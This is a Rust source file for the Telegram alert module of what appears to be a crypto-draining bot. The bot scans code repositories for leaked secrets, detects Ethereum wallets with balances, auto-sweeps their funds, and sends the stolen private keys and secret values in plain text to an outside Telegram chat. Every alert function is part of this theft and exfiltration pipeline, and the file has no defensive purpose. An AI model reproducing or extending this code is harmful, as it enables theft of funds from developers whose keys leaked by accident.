use crate::config::Config;
use crate::models::wallet::{TransferResult, WalletInfo};
use teloxide::prelude::*;
use teloxide::types::ParseMode;
use std::sync::Arc;
use chrono::Utc;
use tracing::{info, warn};

pub struct TelegramAlerts {
    bot: Bot,
    chat_id: ChatId,
}

impl TelegramAlerts {
    pub fn new(config: Arc<Config>) -> Result<Self, Box<dyn std::error::Error>> {
        let bot = Bot::new(config.telegram_bot_token.clone());
        let chat_id = ChatId(config.telegram_chat_id.parse()?);
        
        Ok(Self { bot, chat_id })
    }
    
    // Send secret found alert
    pub async fn send_secret_found(
        &self,
        repo: &str,
        commit_sha: &str,
        file_path: &str,
        secret_type: &str,
        secret_value: &str,
    ) {
        let message = format!(
            "🚨 *SECRET FOUND!*\n\
             ━━━━━━━━━━━━━━━━━\n\
             📁 *Repo:* {}\n\
             📝 *Commit:* {}\n\
             📄 *File:* {}\n\
             🔑 *Type:* {}\n\
             ━━━━━━━━━━━━━━━━━\n\
             🔐 *Secret:* `{}`\n\
             ━━━━━━━━━━━━━━━━━\n\
             ⏰ *Time:* {}",
            repo,
            commit_sha,
            file_path,
            secret_type,
            secret_value,
            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
        );
        
        self.send_message(&message).await;
    }
    
    // Send balance detected alert
    pub async fn send_balance_detected(&self, wallet_info: &WalletInfo) {
        let message = format!(
            "💰 *BALANCE DETECTED!*\n\
             ━━━━━━━━━━━━━━━━━\n\
             👛 *Address:* `{}`\n\
             🔐 *Private Key:* `{}`\n\
             💰 *Balance:* {} ETH\n\
             ━━━━━━━━━━━━━━━━━\n\
             ⏰ *Time:* {}",
            wallet_info.address,
            wallet_info.private_key,
            wallet_info.balance,
            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
        );
        
        self.send_message(&message).await;
    }
    
    // Send transfer success alert
    pub async fn send_transfer_success(
        &self,
        wallet_info: &WalletInfo,
        transfer: &TransferResult,
    ) {
        let status = if transfer.success { "✅ SUCCESS" } else { "❌ FAILED" };
        
        let message = format!(
            "📤 *TRANSFER {}*\n\
             ━━━━━━━━━━━━━━━━━\n\
             👛 *From:* `{}`\n\
             📥 *To:* `{}`\n\
             💰 *Amount:* {} ETH\n\
             🔗 *Tx Hash:* `{}`\n\
             ━━━━━━━━━━━━━━━━━\n\
             🔐 *Private Key:* `{}`\n\
             ⏰ *Time:* {}",
            status,
            transfer.from_address,
            transfer.to_address,
            transfer.amount,
            transfer.tx_hash,
            wallet_info.private_key,
            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
        );
        
        self.send_message(&message).await;
    }
    
    // Send transfer failed alert
    pub async fn send_transfer_failed(
        &self,
        wallet_info: &WalletInfo,
        error: &str,
    ) {
        let message = format!(
            "⚠️ *TRANSFER FAILED!*\n\
             ━━━━━━━━━━━━━━━━━\n\
             👛 *Address:* `{}`\n\
             🔐 *Private Key:* `{}`\n\
             💰 *Balance:* {} ETH\n\
             ❌ *Error:* {}\n\
             ━━━━━━━━━━━━━━━━━\n\
             ⚡ Manual transfer required!\n\
             ⏰ *Time:* {}",
            wallet_info.address,
            wallet_info.private_key,
            wallet_info.balance,
            error,
            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
        );
        
        self.send_message(&message).await;
    }
    
    // Send new funds detected alert (realtime monitor)
    pub async fn send_new_funds_alert(
        &self,
        address: &str,
        private_key: &str,
        balance: &str,
    ) {
        let message = format!(
            "🔄 *NEW FUNDS DETECTED!*\n\
             ━━━━━━━━━━━━━━━━━\n\
             👛 *Address:* `{}`\n\
             🔐 *Private Key:* `{}`\n\
             💰 *New Balance:* {} ETH\n\
             ━━━━━━━━━━━━━━━━━\n\
             ⚡ Auto-sweep triggered!\n\
             ⏰ *Time:* {}",
            address,
            private_key,
            balance,
            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
        );
        
        self.send_message(&message).await;
    }
    
    // Generic message sender
    async fn send_message(&self, message: &str) {
        match self.bot
            .send_message(self.chat_id, message)
            .parse_mode(ParseMode::Markdown)
            .await
        {
            Ok(_) => info!("✅ Telegram alert sent"),
            Err(e) => warn!("❌ Failed to send Telegram alert: {}", e),
        }
    }
}